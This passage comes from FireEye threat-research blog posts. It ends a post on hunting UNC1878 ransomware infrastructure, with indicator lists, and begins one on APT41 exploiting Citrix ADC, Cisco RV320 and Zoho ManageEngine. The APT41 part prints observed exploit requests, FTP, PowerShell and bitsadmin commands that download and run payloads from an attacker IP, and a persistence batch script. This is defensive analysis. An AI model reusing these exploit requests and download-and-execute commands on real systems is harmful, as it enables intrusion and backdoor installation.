            Date: <b>2020-01-27T23:32:18Z<br />  </b>Registrar
          Registration Expiration Date: 2021-01-27T23:32:18Z<br />
            Registrar: <b>Hosting Concepts B.V. d/b/a
      Openprovider</b></span></td> </tr></tbody></table>
 <p>
  <span class="type-XS">Figure 3: WHOIS record for the domain cylenceprotect[.]com</span></p>
 <p>Turning our attention to the server, the domain resolved to
  45.76.20.140, an IP address owned by the VPS provider Choopa. In
  addition, the domain used self-hosted name servers
  ns1.cylenceprotect[.]com and ns2.cylenceprotect[.]com, which also
  resolved to the Choopa IP address. Network scan data for the server
  uncovered a certificate on port 80 and 443, a snippet of which can be
  seen in Figure 4.</p>
 <table cellpadding="1" cellspacing="0" border="1"> <tbody>
    <tr>
      <td><span class="code">Certificate:<br />      Data:<br />       
            Version: 3 (0x2)<br />          Serial Number:<br />       
               
          03:a8:60:02:c7:dd:7f:88:5f:2d:86:0d:88:41:e5:3e:25:f0<br />   
            Signature Algorithm: sha256WithRSAEncryption<br />         
          Issuer: C=US, O=Let's Encrypt, CN=Let's Encrypt Authority
          X3<br />          Validity<br />              <b>Not Before:
            Jan 28 02:02:14 2020 GMT<br />  </b>            Not After :
          Apr 27 02:02:14 2020 GMT<br />          <b>Subject:
      CN=cylenceprotect[.]com</b></span></td> </tr></tbody></table>
 <p>
  <span class="type-XS">Figure 4: TLS Certificate for the domain cylenceprotect[.]com</span></p>
 <p>The certificate was issued by Let’s Encrypt, with the earliest
  validity date within 24 hours of the activity detected by Managed
  Defense, substantiating the speed in which this threat actor operates.
  Along with the certificate in Figure 4, we also identified the default
  generated, self-signed Cobalt Strike certificate (Figure 5) on port
  54546 (50050 by default).</p>
 <table cellpadding="1" cellspacing="0" border="1"> <tbody>
    <tr>
      <td><span class="code">Certificate:<br />      Data:<br />       
            Version: 3 (0x2)<br />          Serial Number: 1843990795
          (0x6de9110b)<br />      Signature Algorithm:
          sha256WithRSAEncryption<br />          <b>Issuer: C=Earth,
            ST=Cyberspace, L=Somewhere, O=cobaltstrike,
            OU=AdvancedPenTesting, CN=Major Cobalt Strike<br />  </b>   
              Validity<br />              <b>Not Before: Jan 28 03:06:30
            2020 GMT<br />  </b>            Not After : Apr 27 03:06:30
          2020 GMT<br />          <b>Subject: C=Earth, ST=Cyberspace,
            L=Somewhere, O=cobaltstrike, OU=AdvancedPenTesting, CN=Major
            Cobalt Strike</b></span></td> </tr></tbody></table>
 <p>
  <span class="type-XS">Figure 5: Default Cobalt Strike TLS Certificate
    used by UNC1878</span></p>
 <p>Similar to the certificate on port 80 and 443, the earliest validity
  date was again within 24 hours of the intrusion identified by Managed
  Defense. Continuing analysis on the server, we acquired the BEACON
  stager and subsequent BEACON payload, which was configured to use the
    <a
    href="https://github.com/rsmudge/Malleable-C2-Profiles/blob/master/normal/amazon.profile">Amazon
    malleable C2 profile</a>.</p>
 <p>While these indicators may not hold significant weight on their own,
  together they create a recognizable pattern to fuel proactive
  discovery of related infrastructure. We began hunting for servers that
  exhibited the same characteristics as those used by UNC1878. Using
  third-party scan data, we quickly identified additional servers that
  matched a preponderance of UNC1878 tradecraft:</p>
 <ul> <li>Domains typically comprised of generic IT or security related
    terms such as “update”, “system”, and “service”.</li> <li>Domains
    registered with “Hosting Concepts B.V. d/b/a Openprovider&quot; as
    early as December 19, 2019.</li> <li>Self-hosted name servers.</li>
    <li>Let’s Encrypt certificates on port 80.</li> <li>Virtual private
    servers hosted predominantly by Choopa.</li> <li>BEACON payloads
    configured with the Amazon malleable C2 profile.</li> <li>Cobalt
    Strike Teams Servers on non-standard ports.</li> </ul>
 <p>Along with certificates matching UNC1878 tradecraft, we also found
  self-signed <a href="http://www.fastandeasyhacking.com/">Armitage</a>
  certificates, indicating this group may use multiple offensive
  security tools.</p>
 <p>Pivoting on limited indicators extracted from a single Managed
  Defense intrusion, a small cluster of activity was expanded into a
  more diverse set of indicators cardinal to UNC1878. While the
  objective and goal of this threat actor had not yet manifested, the
  correlation of infrastructure allowed our team to recognize this
  threat actor’s operations against other customers.</p>
 <h4>Discovery</h4>
 <p>With an established modus operandi for UNC1878, our team quickly
  identified several related intrusions in support of <a
    href="/content/fireeye-www/en_US/mandiant/incident-response.html">FireEye
  Mandiant</a> investigations over the next week. Within two days of our
  initial clustering and expansion of UNC1878 from the original Managed
  Defense investigation, Mandiant Incident Responders were investigating
  activity at a U.S. based medical equipment company with several
  indicators we had previously identified and attributed to UNC1878.
  Attributed domains, payloads and methodologies provided consultants
  with a baseline to build detections on, as well as a level of
  confidence in the actor’s capabilities and speed in which they operate.</p>
 <p>Three days later, UNC1878 was identified during another incident
  response engagement at a restaurant chain. In this engagement,
  Mandiant consultants found evidence of attempted deployment of RYUK
  ransomware on hundreds of systems, finally revealing UNC1878’s desired
  end goal. In the following weeks, we continued to encounter UNC1878 in
  various phases of their intrusions at several Mandiant Incident
  Response and Managed Defense customers.</p>
 <p>While services data offers us a depth of understanding into these
  intrusions, we turn to our product telemetry to understand the breadth
  of activity, getting a better worldview and perspective on the global
  prevalence of this threat actor. This led to the discovery of an
  UNC1878 intrusion at a technology company, resulting in Mandiant
  immediately notifying the affected customer. By correlating multiple
  UNC1878 intrusions across our services and product customers, it
  became evident that the targeting was indiscriminate, a common
  characteristic of opportunistic ransomware campaigns.</p>
 <p>Although initially there were unanswered questions surrounding
  UNC1878’s intent, we were able to provide valuable insights into their
  capabilities to our consultants and analysts. In turn, the intrusion
  data gathered during these engagements continued the cycle of building
  our understanding of UNC1878’s tradecraft, enabling our responders to
  handle these incidents swiftly in the face of imminent ransomware deployment.</p>
 <h4>Conclusion</h4>
 <p>Threat actors continue to use mass malware campaigns to establish
  footholds into target environments, followed by interactive operations
  focused on deploying ransomware such as RYUK, DOPPLEPAYMER and MAZE.
  Looking at the overall trend of intrusions FireEye responds to, the
  growing shift from traditional PCI theft to ransomware has allowed
  threat actors such as UNC1878 to widen their scope and increase their
  tempo, costing organizations millions of dollars due to business
  disruption and ransom payments. However, apart from their speed,
  UNC1878 does not stand out among the increasing number of groups
  following this trend, and should not be the key takeaway of this blog post.</p>
 <p>The cycle of analysis and discovery used for UNC1878 lies at the
  core of our team’s mission to rapidly detect and pursue impactful
  adversaries at scale. Starting from a singular intrusion at a Managed
  Defense client, we were able to discover UNC1878 activity at multiple
  customers. Using our analysis of the early stages of their activity
  allowed us to pivot and pursue this actor across otherwise unrelated
  investigations. As we refine and expand our understanding of UNC1878’s
  tradecraft, our team enables Mandiant and Managed Defense to
  efficiently identify, respond to, and eradicate a financially
  motivated threat actor whose end goal could cripple targeted
  organizations. The principles applied in pursuit of this actor are
  crucial to tracking any adversary and are ultimately how the Advanced
  Practices team surfaces meaningful activity across the FireEye ecosystem.</p>
 <h4>Acknowledgements</h4>
 <p>Thank you to Andrew Thompson, Dan Perez, Steve Miller, John Gorman
  and Brendan McKeague for technical review of this content. In
  addition, thank you to the frontline responders harvesting valuable
  intrusion data that enables our research.</p>
 <h4>Indicators of Compromise</h4>
 <p>
  <i>Domains</i></p>
 <ul> <li>
    <span class="code">aaatus[.]com</span></li> <li>
    <span class="code">avrenew[.]com</span></li> <li>
    <span class="code">besttus[.]com</span></li> <li>
    <span class="code">bigtus[.]com</span></li> <li>
    <span class="code">brainschampions[.]com</span></li> <li>
    <span class="code">checkwinupdate[.]com</span></li> <li>
    <span class="code">ciscocheckapi[.]com</span></li> <li>
    <span class="code">cleardefencewin[.]com</span></li> <li>
    <span class="code">cmdupdatewin[.]com</span></li> <li>
    <span class="code">comssite[.]com</span></li> <li>
    <span class="code">conhostservice[.]com</span></li> <li>
    <span class="code">cylenceprotect[.]com</span></li> <li>
    <span class="code">defenswin[.]com</span></li> <li>
    <span class="code">easytus[.]com</span></li> <li>
    <span class="code">findtus[.]com</span></li> <li>
    <span class="code">firsttus[.]com</span></li> <li>
    <span class="code">freeallsafe[.]com</span></li> <li>
    <span class="code">freeoldsafe[.]com</span></li> <li>
    <span class="code">greattus[.]com</span></li> <li>
    <span class="code">havesetup[.]net</span></li> <li>
    <span class="code">iexploreservice[.]com</span></li> <li>
    <span class="code">jomamba[.]best</span></li> <li>
    <span class="code">livecheckpointsrs[.]com</span></li> <li>
    <span class="code">livetus[.]com</span></li> <li>
    <span class="code">lsassupdate[.]com</span></li> <li>
    <span class="code">lsasswininfo[.]com</span></li> <li>
    <span class="code">microsoftupdateswin[.]com</span></li> <li>
    <span class="code">myservicebooster[.]com</span></li> <li>
    <span class="code">myservicebooster[.]net</span></li> <li>
    <span class="code">myserviceconnect[.]net</span></li> <li>
    <span class="code">myserviceupdater[.]com</span></li> <li>
    <span class="code">myyserviceupdater[.]com</span></li> <li>
    <span class="code">renovatesystem[.]com</span></li> <li>
    <span class="code">service-updater[.]com</span></li> <li>
    <span class="code">servicesbooster[.]com</span></li> <li>
    <span class="code">servicesbooster[.]org</span></li> <li>
    <span class="code">servicesecurity[.]org</span></li> <li>
    <span class="code">serviceshelpers[.]com</span></li> <li>
    <span class="code">serviceupdates[.]net</span></li> <li>
    <span class="code">serviceuphelper[.]com</span></li> <li>
    <span class="code">sophosdefence[.]com</span></li> <li>
    <span class="code">target-support[.]online</span></li> <li>
    <span class="code">taskshedulewin[.]com</span></li> <li>
    <span class="code">timesshifts[.]com</span></li> <li>
    <span class="code">topsecurityservice[.]net</span></li> <li>
    <span class="code">topservicehelper[.]com</span></li> <li>
    <span class="code">topservicesbooster[.]com</span></li> <li>
    <span class="code">topservicesecurity[.]com</span></li> <li>
    <span class="code">topservicesecurity[.]net</span></li> <li>
    <span class="code">topservicesecurity[.]org</span></li> <li>
    <span class="code">topservicesupdate[.]com</span></li> <li>
    <span class="code">topservicesupdates[.]com</span></li> <li>
    <span class="code">topserviceupdater[.]com</span></li> <li>
    <span class="code">update-wind[.]com</span></li> <li>
    <span class="code">updatemanagir[.]us</span></li> <li>
    <span class="code">updatewinlsass[.]com</span></li> <li>
    <span class="code">updatewinsoftr[.]com</span></li> <li>
    <span class="code">web-analysis[.]live</span></li> <li>
    <span class="code">windefenceinfo[.]com</span></li> <li>
    <span class="code">windefens[.]com</span></li> <li>
    <span class="code">winsysteminfo[.]com</span></li> <li>
    <span class="code">winsystemupdate[.]com</span></li> <li>
    <span class="code">worldtus[.]com</span></li> <li>
    <span class="code">yoursuperservice[.]com</span></li> </ul>
 <p>
  <i>IP Addresses</i></p>
 <ul> <li>
    <span class="code">31.7.59.141</span></li> <li>
    <span class="code">45.32.30.162</span></li> <li>
    <span class="code">45.32.130.5</span></li> <li>
    <span class="code">45.32.161.213</span></li> <li>
    <span class="code">45.32.170.9</span></li> <li>
    <span class="code">45.63.8.219</span></li> <li>
    <span class="code">45.63.95.187</span></li> <li>
    <span class="code">45.76.20.140</span></li> <li>
    <span class="code">45.76.167.35</span></li> <li>
    <span class="code">45.76.231.195</span></li> <li>
    <span class="code">45.77.58.172</span></li> <li>
    <span class="code">45.77.89.31</span></li> <li>
    <span class="code">45.77.98.157</span></li> <li>
    <span class="code">45.77.119.212</span></li> <li>
    <span class="code">45.77.153.72</span></li> <li>
    <span class="code">45.77.206.105</span></li> <li>
    <span class="code">63.209.33.131</span></li> <li>
    <span class="code">66.42.97.225</span></li> <li>
    <span class="code">66.42.99.79</span></li> <li>
    <span class="code">79.124.60.117</span></li> <li>
    <span class="code">80.240.18.106</span></li> <li>
    <span class="code">81.17.25.210</span></li> <li>
    <span class="code">95.179.147.215</span></li> <li>
    <span class="code">95.179.210.8</span></li> <li>
    <span class="code">95.179.215.228</span></li> <li>
    <span class="code">96.30.192.141</span></li> <li>
    <span class="code">96.30.193.57</span></li> <li>
    <span class="code">104.156.227.250</span></li> <li>
    <span class="code">104.156.245.0</span></li> <li>
    <span class="code">104.156.250.132</span></li> <li>
    <span class="code">104.156.255.79</span></li> <li>
    <span class="code">104.238.140.239</span></li> <li>
    <span class="code">104.238.190.126</span></li> <li>
    <span class="code">108.61.72.29</span></li> <li>
    <span class="code">108.61.90.90</span></li> <li>
    <span class="code">108.61.176.237</span></li> <li>
    <span class="code">108.61.209.123</span></li> <li>
    <span class="code">108.61.242.184</span></li> <li>
    <span class="code">140.82.5.67</span></li> <li>
    <span class="code">140.82.10.222</span></li> <li>
    <span class="code">140.82.27.146</span></li> <li>
    <span class="code">140.82.60.155</span></li> <li>
    <span class="code">144.202.12.197</span></li> <li>
    <span class="code">144.202.83.4</span></li> <li>
    <span class="code">149.28.15.247</span></li> <li>
    <span class="code">149.28.35.35</span></li> <li>
    <span class="code">149.28.50.31</span></li> <li>
    <span class="code">149.28.55.197</span></li> <li>
    <span class="code">149.28.81.19</span></li> <li>
    <span class="code">149.28.113.9</span></li> <li>
    <span class="code">149.28.122.130</span></li> <li>
    <span class="code">149.28.246.25</span></li> <li>
    <span class="code">149.248.5.240</span></li> <li>
    <span class="code">149.248.56.113</span></li> <li>
    <span class="code">149.248.58.11</span></li> <li>
    <span class="code">151.106.56.223</span></li> <li>
    <span class="code">155.138.135.182</span></li> <li>
    <span class="code">155.138.214.247</span></li> <li>
    <span class="code">155.138.216.133</span></li> <li>
    <span class="code">155.138.224.221</span></li> <li>
    <span class="code">207.148.8.61</span></li> <li>
    <span class="code">207.148.15.31</span></li> <li>
    <span class="code">207.148.21.17</span></li> <li>
    <span class="code">207.246.67.70</span></li> <li>
    <span class="code">209.222.108.106</span></li> <li>
    <span class="code">209.250.255.172</span></li> <li>
    <span class="code">216.155.157.249</span></li> <li>
    <span class="code">217.69.15.175</span></li> </ul>
 <p>
  <i>BEACON Staging URLs</i></p>
 <ul> <li>
    <span
  class="code">hxxp://104.156.255[.]79:80/avbcbgfyhunjmkmk</span></li> <li>
    <span
  class="code">hxxp://149.28.50[.]31:80/adsrxdfcffdxfdsgfxzxds</span></li> <li>
    <span
  class="code">hxxp://149.28.81[.]19:80/ajdlkashduiqwhuyeu12312g3yugshdahqjwgye1g2uy31u1</span></li> <li>
    <span
  class="code">hxxp://45.32.161[.]213:80/ephfusaybuzabegaexbkakskjfgksajgbgfckskfnrdgnkhdsnkghdrngkhrsngrhgcngyggfxbgufgenwfxwgfeuyenfgx</span></li> <li>
    <span
  class="code">hxxp://45.63.8[.]219:80/ajhgfrtyujhytr567uhgfrt6y789ijhg</span></li> <li>
    <span
  class="code">hxxp://66.42.97[.]225:80/aqedfy345yu9876red45f6g78j90</span></li> <li>
    <span
  class="code">hxxp://findtus[.]com/akkhujhbjcjcjhufuuljlvu</span></li> <li>
    <span
  class="code">hxxp://thedemocraticpost[.]com/kflmgkkjdfkmkfl</span></li> <li>
    <span
  class="code">hxxps://brainschampions[.]com:443/atrsgrtehgsetrh5ge</span></li> <li>
    <span
  class="code">hxxps://ciscocheckapi[.]com:80/adsgsergesrtvfdvsa</span></li> <li>
    <span
  class="code">hxxps://cylenceprotect[.]com:80/abresgbserthgsbabrt</span></li> <li>
    <span
  class="code">hxxps://havesetup[.]net/afgthyjuhtgrfety</span></li> <li>
    <span
  class="code">hxxps://servicesbooster[.]org:443/sfer4f54</span></li> <li>
    <span
  class="code">hxxps://servicesecurity[.]org:443/fuhvbjk</span></li> <li>
    <span
  class="code">hxxps://timesshifts[.]com:443/akjhtyrdtfyguhiugyft</span></li> <li>
    <span
  class="code">hxxps://timesshifts[.]com:443/ry56rt6yh5rth</span></li> <li>
    <span
  class="code">hxxps://update-wind[.]com/aergerhgrhgeradgerg</span></li> <li>
    <span
  class="code">hxxps://updatemanagir[.]us:80/afvSfaewfsdZFAesf</span></li> </ul>
http://www.fireeye.com/blog/threat-research/2020/03/the-cycle-of-adversary-pursuit.html2020-03-31T15:00:00.000Z2020-07-24T07:20:13.603ZThis Is Not a Test: APT41 Initiates Global Intrusion Campaign Using
Multiple Exploitsnoemail@noemail.orgChristopher Glyer<p>Beginning this year, FireEye observed <a
    href="https://content.fireeye.com/apt-41/rpt-apt41/">Chinese actor
  APT41</a> carry out one of the broadest campaigns by a Chinese cyber
  espionage actor we have observed in recent years. Between January 20
  and March 11, FireEye observed <a
  href="/content/fireeye-www/en_US/blog/threat-research/2019/08/game-over-detecting-and-stopping-an-apt41-operation.html">APT41</a>
  attempt to exploit vulnerabilities in <a
    href="https://nvd.nist.gov/vuln/detail/CVE-2019-19781">Citrix
  NetScaler/ADC</a>, Cisco routers, and <a
    href="https://nvd.nist.gov/vuln/detail/CVE-2020-10189">Zoho
    ManageEngine Desktop Central</a> at over 75 FireEye customers.
  Countries we’ve seen targeted include Australia, Canada, Denmark,
  Finland, France, India, Italy, Japan, Malaysia, Mexico, Philippines,
  Poland, Qatar, Saudi Arabia, Singapore, Sweden, Switzerland, UAE, UK
  and USA. The following industries were targeted: Banking/Finance,
  Construction, Defense Industrial Base, Government, Healthcare, High
  Technology, Higher Education, Legal, Manufacturing, Media, Non-profit,
  Oil &amp; Gas, Petrochemical, Pharmaceutical, Real Estate,
  Telecommunications, Transportation, Travel, and Utility. It’s unclear
  if APT41 scanned the Internet and attempted exploitation en masse or
  selected a subset of specific organizations to target, but the victims
  appear to be more targeted in nature.</p>
 <h4>Exploitation of CVE-2019-19781 (Citrix Application Delivery
  Controller [ADC])</h4>
 <p>Starting on January 20, 2020, APT41 used the IP address
  66.42.98[.]220 to attempt exploits of Citrix Application Delivery
  Controller (ADC) and Citrix Gateway devices with <a
  href="https://support.citrix.com/article/CTX267027">CVE-2019-19781</a>
  (published December 17, 2019).</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/apt41exploits/apt41-timeline-blog-v2.png" alt="" />
  <br /> <span class="type-XS">Figure 1: Timeline of key events</span></p>
 <p>The initial CVE-2019-19781 exploitation activity on January 20 and
  January 21, 2020, involved execution of the command ‘file /bin/pwd’,
  which may have achieved two objectives for APT41. First, it would
  confirm whether the system was vulnerable and the <a
  href="https://support.citrix.com/article/CTX267679">mitigation</a>
  wasn’t applied. Second, it may return architecture-related information
  that would be required knowledge for APT41 to successfully deploy a
  backdoor in a follow-up step.  </p>
 <p>One interesting thing to note is that all observed requests were
  only performed against Citrix devices, suggesting APT41 was operating
  with an already-known list of identified devices accessible on the internet.</p>
 <table cellpadding="1" cellspacing="0" border="1"> <tbody>
    <tr>
      <td><p>POST /vpns/portal/scripts/newbm.pl HTTP/1.1<br /> Host:
          [redacted]<br /> Connection: close<br /> Accept-Encoding:
          gzip, deflate<br /> Accept: */*<br /> User-Agent:
          python-requests/2.22.0<br /> NSC_NONCE: nsroot<br /> NSC_USER:
          ../../../netscaler/portal/templates/[redacted]<br />
          Content-Length: 96<br /> <br />
          url=http://example.com&amp;title=[redacted]&amp;desc=[%
          template.new('BLOCK' = 'print `file /bin/pwd`') %]</p> </td> </tr></tbody></table>
 <p>
  <span class="type-XS">Figure 2: Example APT41 HTTP traffic exploiting CVE-2019-19781</span></p>
 <p>There is a lull in APT41 activity between January 23 and February 1,
  which is likely related to the Chinese Lunar New Year holidays which
  occurred between January 24 and January 30, 2020. This has been a
  common activity pattern by Chinese APT groups in past years as well.</p>
 <p>Starting on February 1, 2020, APT41 moved to using CVE-2019-19781
  exploit payloads that initiate a download via the File Transfer
  Protocol (FTP). Specifically, APT41 executed the command ‘/usr/bin/ftp
  -o /tmp/bsd ftp://test:[redacted]\@66.42.98[.]220/bsd’, which
  connected to 66.42.98[.]220 over the FTP protocol, logged in to the
  FTP server with a username of ‘test’ and a password that we have
  redacted, and then downloaded an unknown payload named ‘bsd’ (which
  was likely a backdoor).</p>
 <table cellpadding="1" cellspacing="0" border="1"> <tbody>
    <tr>
      <td><p>POST /vpn/../vpns/portal/scripts/newbm.pl HTTP/1.1<br />
          Accept-Encoding: identity<br /> Content-Length: 147<br />
          Connection: close<br /> Nsc_User:
          ../../../netscaler/portal/templates/[redacted]<br />
          User-Agent: Python-urllib/2.7<br /> Nsc_Nonce: nsroot<br />
          Host: [redacted]<br /> Content-Type:
          application/x-www-form-urlencoded<br /> <br />
          url=http://example.com&amp;title=[redacted]&amp;desc=[%
          template.new('BLOCK' = '<b>print `/usr/bin/ftp -o /tmp/bsd
          ftp://test:[redacted]\@66.42.98[.]220/bsd</b>`') %]</p> </td> </tr></tbody></table>
 <p>
  <span class="type-XS">Figure 3: Example APT41 HTTP traffic exploiting CVE-2019-19781</span></p>
 <p>We did not observe APT41 activity at FireEye customers between
  February 2 and February 19, 2020. China initiated COVID-19 related
  quarantines in cities in Hubei province starting on January 23 and
  January 24, and rolled out quarantines to additional provinces
  starting between February 2 and February 10. While it is possible that
  this reduction in activity might be related to the COVID-19 quarantine
  measures in China, APT41 may have remained active in other ways, which
  we were unable to observe with FireEye telemetry. We observed a
  significant uptick in CVE-2019-19781 exploitation on February 24 and
  February 25. The exploit behavior was almost identical to the activity
  on February 1, where only the name of the payload ‘un’ changed.</p>
 <table cellpadding="1" cellspacing="0" border="1"> <tbody>
    <tr>
      <td><p>POST /vpn/../vpns/portal/scripts/newbm.pl HTTP/1.1<br />
          Accept-Encoding: identity<br /> Content-Length: 145<br />
          Connection: close<br /> Nsc_User:
          ../../../netscaler/portal/templates/[redacted]<br />
          User-Agent: Python-urllib/2.7<br /> Nsc_Nonce: nsroot<br />
          Host: [redacted]<br /> Content-Type:
          application/x-www-form-urlencoded<br /> <br />
          url=http://example.com&amp;title= [redacted]&amp;desc=[%
          template.new('BLOCK' = '<b>print `/usr/bin/ftp -o /tmp/un
          ftp://test:[redacted]\@66.42.98[.]220/un</b>`') %]</p> </td> </tr></tbody></table>
 <p>
  <span class="type-XS">Figure 4: Example APT41 HTTP traffic exploiting CVE-2019-19781</span></p>
 <p>Citrix released a <a
  href="https://support.citrix.com/article/CTX267027">mitigation</a> for
  CVE-2019-19781 on December 17, 2019, and as of January 24, 2020,
  released permanent fixes for all supported versions of Citrix ADC,
  Gateway, and SD-WAN WANOP.</p>
 <h4>Cisco Router Exploitation</h4>
 <p>On February 21, 2020, APT41 successfully exploited a Cisco RV320
  router at a telecommunications organization and downloaded a 32-bit
  ELF binary payload compiled for a 64-bit MIPS processor named ‘fuc’
  (MD5: 155e98e5ca8d662fad7dc84187340cbc). It is unknown what specific
  exploit was used, but there is a Metasploit module that combines two
  CVE’s (<a
  href="https://nvd.nist.gov/vuln/detail/CVE-2019-1653">CVE-2019-1653</a>
  and <a
  href="https://nvd.nist.gov/vuln/detail/CVE-2019-1652">CVE-2019-1652</a>)
  to <a
    href="https://www.rapid7.com/db/modules/exploit/linux/http/cisco_rv32x_rce">enable
    remote code execution on Cisco RV320 and RV325</a> small business
  routers and uses wget to download the specified payload.</p>
 <table cellpadding="1" cellspacing="0" border="1"> <tbody>
    <tr>
      <td><p>GET /test/fuc<br /> HTTP/1.1<br /> Host:
          66.42.98\.220<br /> User-Agent: Wget<br /> Connection:
        close</p> </td> </tr></tbody></table>
 <p>
  <span class="type-XS">Figure 5: Example HTTP request showing Cisco
    RV320 router downloading a payload via wget</span></p>
 <p>66.42.98[.]220 also hosted a file name
  http://66.42.98[.]220/test/1.txt. The content of 1.txt (MD5:
   c0c467c8e9b2046d7053642cc9bdd57d) is ‘cat
  /etc/flash/etc/nk_sysconfig’, which is the command one would execute
  on a Cisco RV320 router to display the current configuration.</p>
 <p>Cisco PSIRT confirmed that fixed software to address the noted
  vulnerabilities is available and asks customers to review the
  following security advisories and take appropriate action:</p>
 <ul> <li>
    <a
      href="https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20190123-rv-info">Cisco
      Small Business RV320 and RV325 Routers Information Disclosure
  Vulnerability</a></li> <li>
    <a
      href="https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20190123-rv-inject">Cisco
      Small Business RV320 and RV325 Routers Command Injection
  Vulnerability</a></li> </ul>
 <h4>Exploitation of CVE-2020-10189 (Zoho ManageEngine Zero-Day Vulnerability)</h4>
 <p>On March 5, 2020, researcher <a
    href="https://twitter.com/steventseeley/status/1235635108498948096?s=20">Steven
  Seeley</a>, published <a
    href="https://srcincite.io/advisories/src-2020-0011/">an
  advisory</a> and released <a
    href="https://srcincite.io/pocs/src-2020-0011.py.txt">proof-of-concept
  code</a> for a zero-day remote code execution vulnerability in Zoho
  ManageEngine Desktop Central versions prior to 10.0.474 (<a
  href="https://nvd.nist.gov/vuln/detail/CVE-2020-10189">CVE-2020-10189)</a>.
  Beginning on March 8, FireEye observed APT41 use 91.208.184[.]78 to
  attempt to exploit the Zoho ManageEngine vulnerability at more than a
  dozen FireEye customers, which resulted in the compromise of at least
  five separate customers. FireEye observed two separate variations of
  how the payloads (install.bat and storesyncsvc.dll) were deployed. In
  the first variation the CVE-2020-10189 exploit was used to directly
  upload “logger.zip”, a simple Java based program, which contained a
  set of commands to use PowerShell to download and execute install.bat
  and storesyncsvc.dll.</p>
 <table cellpadding="1" cellspacing="0" border="1"> <tbody>
    <tr>
      <td><p>java/lang/Runtime</p> <p>getRuntime</p>
        <p>()Ljava/lang/Runtime;</p> <p>Xcmd /c powershell $client =
          new-object
          System.Net.WebClient;$client.DownloadFile('http://66.42.98[.]220:12345/test/install.bat','C:\<br />
          Windows\Temp\install.bat')&amp;powershell $client = new-object
          System.Net.WebClient;$client.DownloadFile('http://66.42.98[.]220:12345/test/storesyncsvc.dll','<br />
        C:\Windows\Temp\storesyncsvc.dll')&amp;C:\Windows\Temp\install.bat</p>
        <p>'(Ljava/lang/String;)Ljava/lang/Process;</p>
        <p>StackMapTable</p> <p>ysoserial/Pwner76328858520609</p>
        <p>Lysoserial/Pwner76328858520609;</p> </td> </tr></tbody></table>
 <p>
  <span class="type-XS">Figure 6: Contents of logger.zip</span></p>
 <p>Here we see a toolmark from the tool <a
  href="https://github.com/frohoff/ysoserial">ysoserial</a> that was
  used to create the payload in the POC. The string Pwner76328858520609
  is unique to the POC payload, indicating that APT41 likely used the
  POC as source material in their operation.</p>
 <p>In the second variation, FireEye observed APT41 leverage the
  Microsoft BITSAdmin command-line tool to download install.bat (MD5:
  7966c2c546b71e800397a67f942858d0) from known APT41 infrastructure
  66.42.98[.]220 on port 12345.</p>
 <table cellpadding="1" cellspacing="0" border="1"> <tbody>
    <tr>
      <td><p>Parent Process:
        C:\ManageEngine\DesktopCentral_Server\jre\bin\java.exe</p>
          <p>Process Arguments: cmd /c bitsadmin /transfer bbbb
          http://66.42.98[.]220:12345/test/install.bat
        C:\Users\Public\install.bat</p> </td> </tr></tbody></table>
 <p>
  <span class="type-XS">Figure 7: Example FireEye Endpoint Security
    event depicting successful CVE-2020-10189 exploitation</span></p>
 <p>In both variations, the install.bat batch file was used to install
  persistence for a trial-version of Cobalt Strike BEACON loader named
  storesyncsvc.dll (MD5: 5909983db4d9023e4098e56361c96a6f).</p>
 <table cellpadding="1" cellspacing="0" border="1"> <tbody>
    <tr>
      <td><p>@echo off</p> <p>set
        &quot;WORK_DIR=C:\Windows\System32&quot;</p> <p>set
        &quot;DLL_NAME=storesyncsvc.dll&quot;</p> <p>set
        &quot;SERVICE_NAME=StorSyncSvc&quot;</p> <p>set
          &quot;DISPLAY_NAME=Storage Sync Service&quot;</p> <p>set
          &quot;DESCRIPTION=The Storage Sync Service is the top-level
          resource for File Sync. It creates sync relationships with
          multiple storage accounts via multiple sync groups. If this
          service is stopped or disabled, applications will be unable to
          run collectly.&quot;</p> <p> sc stop %SERVICE_NAME%</p> <p>sc
          delete %SERVICE_NAME%</p> <p>mkdir %WORK_DIR%</p> <p>copy
          &quot;%~dp0%DLL_NAME%&quot; &quot;%WORK_DIR%&quot; /Y</p>
          <p>reg add &quot;HKLM\SOFTWARE\Microsoft\Windows
          NT\CurrentVersion\Svchost&quot; /v &quot;%SERVICE_NAME%&quot;
          /t REG_MULTI_SZ /d &quot;%SERVICE_NAME%&quot; /f</p> <p>sc
          create &quot;%SERVICE_NAME%&quot; binPath=
          &quot;%SystemRoot%\system32\svchost.exe -k
          %SERVICE_NAME%&quot; type= share start= auto error= ignore
          DisplayName= &quot;%DISPLAY_NAME%&quot;</p> <p>SC failure
          &quot;%SERVICE_NAME%&quot; reset= 86400 actions=
        restart/60000/restart/60000/restart/60000</p> <p>sc description
          &quot;%SERVICE_NAME%&quot; &quot;%DESCRIPTION%&quot;</p>
          <p>reg add
          &quot;HKLM\SYSTEM\CurrentControlSet\Services\%SERVICE_NAME%\Parameters&quot;
        /f</p> <p>reg add
          &quot;HKLM\SYSTEM\CurrentControlSet\Services\%SERVICE_NAME%\Parameters&quot;
          /v &quot;ServiceDll&quot; /t REG_EXPAND_SZ /d
          &quot;%WORK_DIR%\%DLL_NAME%&quot; /f</p> <p>net start
        &quot;%SERVICE_NAME%&quot;</p> </td> </tr></tbody></table>
 <p>
  <span class="type-XS">Figure 8: Contents of install.bat</span></p>
 <p>Storesyncsvc.dll was a Cobalt Strike BEACON implant (trial-version)
  which connected to exchange.dumb1[.]com (with a DNS resolution of
  74.82.201[.]8) using a jquery malleable command and control (C2) profile.</p>
 <table cellpadding="1" cellspacing="0" border="1"> <tbody>
    <tr>
      <td><p>GET /jquery-3.3.1.min.js HTTP/1.1<br /> Host:
          cdn.bootcss.com<br /> Accept:
          text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<br />
          Referer: http://cdn.bootcss.com/<br /> Accept-Encoding: gzip,
          deflate<br /> Cookie:
          __cfduid=CdkIb8kXFOR_9Mn48DQwhIEuIEgn2VGDa_XZK_xAN47OjPNRMpJawYvnAhPJYM<br />
          DA8y_rXEJQGZ6Xlkp_wCoqnImD-bj4DqdTNbj87Rl1kIvZbefE3nmNunlyMJZTrDZfu4EV6oxB8yKMJfLXydC5YF9OeZwqBSs3Tun12BVFWLI<br />
          User-Agent: Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0)
          like Gecko<br /> Connection: Keep-Alive Cache-Control:
        no-cache</p> </td> </tr></tbody></table>
